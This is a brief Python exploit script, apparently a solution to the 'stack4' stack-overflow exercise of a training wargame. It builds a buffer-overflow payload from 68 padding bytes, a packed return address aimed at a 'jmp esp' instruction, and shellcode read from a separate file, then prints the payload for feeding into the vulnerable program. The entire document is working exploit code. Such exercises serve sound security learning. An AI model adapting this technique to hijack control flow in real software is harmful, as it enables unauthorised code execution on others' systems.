#!/usr/bin/env python
import sys
import struct
jmp_esp=0xb7e3539d
shellcode='A' * 68 + struct.pack('<I', jmp_esp)
with open('./stack4_shellcode.bin', 'r') as f:
	shellcode += f.read()
sys.stdout.write(shellcode)

